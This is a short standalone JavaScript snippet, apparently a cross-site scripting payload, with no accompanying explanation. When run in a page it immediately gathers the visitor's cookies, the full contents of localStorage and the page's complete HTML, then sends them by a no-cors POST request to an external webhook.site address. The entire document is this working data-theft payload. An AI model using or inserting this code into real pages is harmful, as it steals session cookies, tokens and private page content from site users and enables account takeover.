(() => {
  const data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    html: document.documentElement.outerHTML,
  };

  fetch("	https://webhook.site/774a4165-619b-4f27-8dc1-011eee099626", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
})();
